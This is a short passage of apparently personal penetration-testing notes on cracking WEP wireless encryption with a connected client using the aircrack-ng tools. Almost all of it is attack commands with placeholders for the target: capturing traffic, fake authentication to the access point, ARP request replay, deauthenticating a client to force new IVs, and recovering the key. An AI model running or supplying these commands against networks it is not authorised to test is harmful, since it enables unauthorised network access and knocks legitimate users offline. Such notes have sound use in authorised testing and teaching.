# with connected client

#### Capture + output as wep-01.pcap

{% code overflow="wrap" %}
```
# -c channel -w output filename = recon-0#
sudo airodump-ng -c # --essid AP_NAME --bssid XX:XX:XX:XX:XX:XX -w wep --output-format pcap wlan0mon
```
{% endcode %}

#### Attack

Conduct a fake authentication attack against the AP

```

aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```

Launch the ARP request replay attack:

```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```

Deauthenticate the connected client to force new IV generation by the AP:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Once a significant number of IVs have been captured, run Aircrack-ng against the Airodump capture:

```
aircrack-ng <capture>
```
